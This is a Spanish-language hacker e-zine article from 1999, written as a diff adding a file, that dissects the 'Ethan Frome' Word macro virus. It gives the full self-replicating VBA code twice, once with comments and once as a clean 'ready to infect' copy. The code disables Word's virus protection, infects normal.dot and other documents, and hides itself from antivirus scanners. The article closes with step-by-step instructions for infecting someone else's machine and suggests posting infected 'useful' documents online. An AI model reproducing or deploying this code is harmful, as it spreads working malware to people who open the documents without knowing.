@@ -1,0 +1,433 @@
+Macro Virus.
+
+Nombre: Ethan Frome
+Autor: EW/LN/CB
+Descubierto por ERNT en: 30/Octubre/1999
+Comentarios por: BadBit <badbit@yahoo.com>
+
+Este virus lo encontré en mi escuela de informática, me dí cuenta de
+que todas las computadoras con Word lo tenían. En la primera máquina
+que lo ví estaba incompleto por una extraña razón, le faltaban muchas
+líneas importantes, entonces me cambié a otra máquina y esa si tenía
+el virus completo. Es curioso que todas las máquinas tienen el anti-
+virus PC-Cillin con detección heurística de macrovirus y ni siquiera
+se daban cuenta de la presencia de este virus tan notorio.
+
+No es desctructivo, sólamente se reproduce y pone mensajes de vez en
+cuando, pero nos sirve para aprender como hacerlos, tal vez haga uno
+en el futuro no muy lejando.
+
+A continuación está el código del virus acomodado para dar una mejor
+legibilidad y aparte está completamente comentado por mí, el código
+no presentó ninguna complicación, estaba muy claro desde el inicio.
+Si no saben Visual Basic para Aplicaciones no se preocupen, los co-
+mentarios los guiarán para que entiendan la estructura del virus.
+
+----------------------------------------------------------
+
+Private Sub Document_Close()
+
+s = ActiveDocument.Saved   ' Esta línea define la variable s, la cual es True si el documento
+                           ' tiene cambios que no han sido guardados todavía. En caso contrario
+                           ' tendrá el valor de False.
+
+
+Application.EnableCancelKey = Not -1      ' Evita que se pueda detener el macro aplastando
+                                          ' la combinación CTRL + ENTER
+
+
+With Options:              ' Inicia un bloque que sirve para cambiar las opciones del documento.
+                           ' Generalmente sirve para desabilitar las protecciones.
+
+    .ConfirmConversions = 0:    ' Desabilita la confirmación de conversiones, para que el
+                                ' documento pueda ser guardado con formato de plantilla sin
+                                ' que el usuario se dé cuenta.
+
+    .VirusProtection = 0:       ' Desabilita el cuadro de mensaje que advierte que el documento
+                                ' contiene macros que pudieran ser virus.
+
+    .SaveNormalPrompt = 0:      ' Desabilita el cuadro de mensaje que pregunta si se desea
+                                ' guardar la plantilla normal.dot
+
+End With                   ' Fin del bloque with.
+
+
+Randomize                  ' Inicia la semilla aleatoria.
+
+
+If Dir("c:\ethan.___", 6) = "" Then     ' Verifica la existencia del archivo c:\ethan.___
+                                        ' Si no existe, ejecutará las siguientes líneas:
+
+    Open "c:\ethan.___" For Output As #1   ' Abre el archivo c:\ethan.___ para introducir
+                                           ' datos a él con identificador #1
+
+    For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+
+         Print #1, a
+
+    Next i
+
+    ' Las tres líneas anteriores son el sistema de infección, copian este mismo código al
+    ' archivo ethan. El archivo c:\ethan.___ también sirve como marcador para verificar si no
+    ' ha habido una infección anterior. Esto es muy importante, ya que de faltar un marcador,
+    ' el virus infectaría miles de veces el mismo documento, delatando su presencia.
+    ' Aquí hay solamente un error: nunca se especificó el archivo #1.
+
+    Close #1                            ' Cierra el archivo c:\ethan.___
+
+    SetAttr "c:\ethan.___", 6           ' Cambia los atributos del archivo.
+
+
+End If                                  ' Fin del bloque if.
+
+
+If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
+' Si existe el archivo c:\class.sys, entonces borrarlo.
+
+If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
+    ' Verifica si la plantilla normal está infectada.
+
+   Set t = NormalTemplate.VBProject.VBComponents.Item(1)  ' En caso afirmativo, toma el
+                                                          ' código del virus de la plantilla
+                                                          ' normal.dot y lo transfiere a t.
+
+ ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
+    ' Verifica si el documento activo está infectado.
+
+   Set t = ActiveDocument.VBProject.VBComponents.Item(1)  ' En caso afirmativo, toma el
+                                                          ' código del virus del documento
+                                                          ' activo y lo transfiere a t.
+
+ Else
+
+   t = ""   ' En caso de que ninguna de las dos cosas estuviera infectada, dejar t vacía.
+
+End If
+
+If t <> "" Then              ' Verifica si t está vacía.
+
+   Open "c:\ethan.___" For Input As #1  ' Abre el archivo c:\ethan.___ para leer datos de él.
+
+If LOF(1) = 0 Then GoTo q            ' Si la longitud del archivo ethan.___ es igual a 0,
+                                     ' entonces ir a la etiqueta marcada como q.
+
+i = 1                                ' Le asigna valor de 1 a la variable i.
+
+Do While Not EOF(1)                  ' Haz mientras ethan no llegue al final del archivo:
+
+   Line Input #1, a                     ' Lee los datos de ethan y los asigna a la variable a.
+   t.CodeModule.InsertLines i, a        ' Inserta el contenido de ethan.___ a t, la cual puede
+                                        ' ser o el documento activo, o la plantilla normal.
+   i = i + 1                            ' Le suma 1 a la variable i.
+
+Loop
+
+q:                                      ' Marca la etiqueta q.
+
+Close #1                                ' Cierra el archivo c:\ethan.___
+
+If Rnd < 0.3 Then                       ' Se genera un número aleatorio, y si éste es menor que
+                                        ' .3 se ejecutarán las siguientes líneas:
+
+  With Dialogs(wdDialogFileSummaryInfo): ' Comienza un bloque with para modificar un cuadro de
+                                         ' diálogo.
+
+       .Title = "Ethan Frome":           ' De título: el nombre del virus.
+       .Author = "EW/LN/CB":             ' De autor: el nombre del (o los) autores.
+       .Keywords = "Ethan":              ' Palabras clave: Ethan
+       .Execute:                         ' Ejecuta el cuadro de diálogo.
+
+  End With                               ' Fin del bloque With.
+
+End If                                   ' Fin de la rutina de vanidad.
+
+
+If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs
+  ' Si las primeras 8 letras del nombre del documeton comienzan con "Document", entonces muy
+  ' probablemente no se ha salvado el documento y tiene uno de los nombres default de Word
+  ' y no ha sido salvado, por eso presenta el diálogo de "Save As.."
+
+  FileName:=ActiveDocument.FullName                  ' Asigna al nombre de archivo el nombre
+                                                     ' del documento.
+
+End If                                  ' Fin del If
+
+End Sub                                 ' Fin del sub.
+
+----------------------------------------------------------
+
+Sub AutoOpen()
+
+On Error GoTo out                         ' Protección contra errores.
+
+Options.VirusProtection = False           ' Desabilita la protección contra virus.
+Options.SaveNormalPrompt = False          ' Desabilita la confirmación para guardar normal.dot
+Options.ConfirmConversions = False        ' Desabilita la confirmación de conversión.
+
+ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+  ' Revisa el número de líneas de código del documento activo.
+
+
+nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+  ' Revisa el número de líneas de código de la plantilla normal.
+
+If nt > 70 And ad > 0 Then GoTo out       ' Si nt es mayor que 70, y ad es mayor que 0 el
+                                          ' macro se interrumpe.
+
+
+If nt < 70 Then                           ' Si el número de líneas de la plantilla normal es
+                                          ' menor a 70 quiere decir que no está infectada.
+                                          ' Por lo tanto hay que infectarla.
+
+  Set host = NormalTemplate.VBProject.VBComponents.Item(1)            ' El host será la
+                                                                      ' plantilla normal.
+  ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name      ' Se copia el virus del
+                                                                      ' documento activo al
+                                                                      ' host.
+  ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys" ' Exporta el virus al
+                                                                      ' archivo "c:\class.sys"
+
+End If                                    ' Fin del bloque If.
+
+If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
+ ' Si el número de líneas del código del documento activo es igual a 0, entonces hay
+ ' que infectarlo.
+
+If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
+    ' Esta es una activación por medio de la fecha:
+    ' Si el día es igual a 14 y el mes es posterior a Junio saldrá un mensaje que dice
+    ' en inglés: "Creo que <nombre del usuario> es un estúpido" con título:
+    ' "VicodinES Loves You / Class.Poppy"
+
+
+host.CodeModule.AddFromFile ("c:\class.sys")     ' Le agregará al host el virus almacenado
+                                                 ' en "c:\class.sys"
+
+With host.CodeModule                  ' Inicia el bloque With para
+                                      ' modificar las propiedades del host.
+
+    For x = 1 To 4           ' Inicia un ciclo que se repetirá 4 veces.
+       .deletelines 1        ' Borra una línea del módulo de código del host.
+    Next x                   ' Regresa al principio del ciclo hasta que se
+                             ' repita 4 veces.
+
+End With                              ' Fin del bloque With.
+
+If nt < 70 Then                             ' Si las líneas de código de la plantilla
+                                            ' normal son menores a 70 entonces:
+
+    With host.CodeModule                    ' Modificar al módulo de código del host. En
+                                            ' este caso es la plantilla normal.
+
+       .replaceline 1, "Sub AutoClose()"    ' Reemplaza la primera línea por "Sub AutoClose()"
+                                            ' o sea, crea esa subrutina.
+       .replaceline 71, "Sub ToolsMacro()"  ' Y reemplaza la línea 71 por el inicio del Sub
+                                            ' "ToolsMacro"
+
+    End With                                ' Fin del bloque.
+
+End If                                      ' Fin del If.
+
+With host.CodeModule                     ' Comienzo de la rutina de ocultamiento.
+
+    For x = 2 To 72 Step 2               ' Irá aumentando la variable x de 2 en 2, el ciclo
+                                         ' terminará cuando x sea igual a 72 (el número de
+                                         ' líneas del virus.
+
+    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
+    ' Reemplaza la línea número x por un comentario bastante extraño, es
+    ' el nombre de usuario, más la fecha actual, más la impresora activa, más la ventana activa,
+    ' más el asistente de office activo. Yo creo que esto es con el propósito de ocultar el
+    ' virus de los anti-virus, ya que este comentario siempre será distinto por cada máquina
+    ' que infecte. De la máquina que yo lo saqué era como la línea siguiente:
+'eph26.03.99 20:53:19practica 1Clipo
+    ' eph es el nombre de usuario. 26.03.99 20:53:19 son la fecha y hora de la infección.
+    ' Esa máquina no tenía impresora, por lo tanto no aparece el nombre. practica 1 era la
+    ' ventana activa al momento de la infección. Y Clipo era el asistente de Office activo (el
+    ' odioso clip de caricatura).
+
+    Next x                               ' Devuelve al principio del ciclo hasta que x
+                                         ' sea igual a 72.
+
+End With                                 ' Fin de la rutina de ocultamiento.
+
+out:                             ' Marca la etiqueta out.
+
+If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
+    ' Si la plantilla normal está infectada y el documento no, hay que salvar el documento.
+
+End Sub            ' Fin.
+
+
+----------------------------------------------------------
+
+
+Sub ViewVBCode()
+
+' Este sub andaba ahí de metiche.
+
+End Sub
+
+----------------------------------------------------------
+
+Ahora, viene el código listo para infectar, el anterior no
+lo recomiendo ya que contiene miles de comentarios míos que
+también se pasarían a los demás documentos y aparte pueden
+aterar el funcionamiento del Sub AutoOpen, así que mejor
+poner el código original. NO modifiques NADA del virus para
+asegurar su buen funcionamiento. Al final del archivo vienen
+las instrucciones para infectar documentos.
+
+--------------------comienza aquí-------------------------
+
+Private Sub Document_Close()
+On Error Resume Next
+s = ActiveDocument.Saved
+Application.EnableCancelKey = Not -1
+With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
+Randomize
+If Dir("c:\ethan.___", 6) = "" Then
+Open "c:\ethan.___" For Output As #1
+For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
+Print #1, a
+Next i
+Close #1
+SetAttr "c:\ethan.___", 6
+End If
+If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
+If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
+Set t = NormalTemplate.VBProject.VBComponents.Item(1)
+ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
+Set t = ActiveDocument.VBProject.VBComponents.Item(1)
+Else
+t = ""
+End If
+If t <> "" Then
+Open "c:\ethan.___" For Input As #1
+If LOF(1) = 0 Then GoTo q
+i = 1
+Do While Not EOF(1)
+Line Input #1, a
+t.CodeModule.InsertLines i, a
+i = i + 1
+Loop
+q:
+Close #1
+If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
+If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
+End If
+If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
+End Sub
+
+Sub AutoOpen()
+
+On Error GoTo out
+
+Options.VirusProtection = False
+
+Options.SaveNormalPrompt = False
+
+Options.ConfirmConversions = False
+
+ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+
+nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+
+If nt > 70 And ad > 0 Then GoTo out
+
+If nt < 70 Then
+
+    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
+
+    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
+
+    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
+
+End If
+
+If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
+
+If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
+
+host.CodeModule.AddFromFile ("c:\class.sys")
+
+With host.CodeModule
+
+    For x = 1 To 4
+
+    .deletelines 1
+
+    Next x
+
+End With
+
+If nt < 70 Then
+
+    With host.CodeModule
+
+    .replaceline 1, "Sub AutoClose()"
+
+    .replaceline 71, "Sub ToolsMacro()"
+
+    End With
+
+End If
+
+With host.CodeModule
+
+    For x = 2 To 72 Step 2
+
+    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
+
+    Next x
+
+End With
+
+out:
+
+If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
+
+End Sub
+
+Sub ViewVBCode()
+
+End Sub
+
+----------------------------------------------------------
+
+Hay que tener mucho cuidado
+
+Instrucciones para infectar algún documento de Word con este
+virus:
+
+1. Busca una máquina (ajena de preferencia).
+2. Entra a Word.
+3. Crea o abre documento.
+4. Selecciona Tools - Macro - Visual Basic editor
+   (Herramientas - Macro - Editor de Visual Basic) o presiona
+   Alt + F11.
+5. Se abrirá una ventana que sirve para crear macros y programas.
+   Selecciona View - Code (Ver - Código)
+6. Copia el código del virus y pégalo en la ventana de código que se
+   abrió.
+7. Sal del editor, Word estará en segundo plano.
+8. Selecciona File - Save As... (Archivo - Guardar Como...) y en donde
+   dice "Save as type:" ("Guardar como tipo:") selecciona "Document template"
+   (Plantilla de documento).
+9. Ponle un nombre con extensión *.doc. Es importante que el nombre lo pongas
+   entre comillas, ya que de lo contrario puedes obtener nombres como
+   "Documento infectado.doc.dot", es chiste es tener una plantilla con
+   extensión de documento.
+10. Guarda y cierra el nuevo documento y ya tienes una máquina infectada.
+11. Para infectar otra máquina simplemente abre y cierra el documento que
+    infectaste en la máquina target.
+
+Tip: Escribe algún documento útil, inféctalo y ponlo en Internet.
+
+-------------------------------
+Copyright 1999, El Radiaktivo Newz Team
+Escrito por BadBit <badbit@yahoo.com>
+
+Puedes copiar este artículo o los códigos fuente aquí presentados
+siempre y cuando menciones su procedencia y su autor.
